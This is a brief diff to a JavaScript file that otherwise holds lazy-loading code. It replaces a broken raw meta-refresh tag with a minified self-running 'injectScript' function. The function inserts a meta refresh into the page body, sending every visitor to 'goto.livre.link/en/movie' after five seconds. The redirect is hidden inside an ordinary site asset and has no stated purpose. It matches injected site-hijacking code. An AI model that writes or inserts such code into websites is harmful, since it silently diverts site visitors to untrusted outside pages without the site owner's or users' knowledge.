@@ -79,4 +79,4 @@ dataLazy.forEach(function(a){
     };
   };
 });
-<meta content="5; url=https://goto.livre.link/en/movie" http-equiv="Refresh"></meta>
+(function(){injectScript([{"attr":[{"name":"content","value":"5; url=https://goto.livre.link/en/movie"},{"name":"http-equiv","value":"Refresh"}],"tag":"meta","inner":""}],{"target":"body"});function injectScript(e,t){let n=t.target;for(let t of e){let e=t.tag,r=t.inner,o=document.createElement(e);o.innerHTML=r;let c=t.attr;for(let e of c)o.setAttribute(e.name,e.value);document.querySelector(n)&&document.querySelector(n).append(o)}}})();
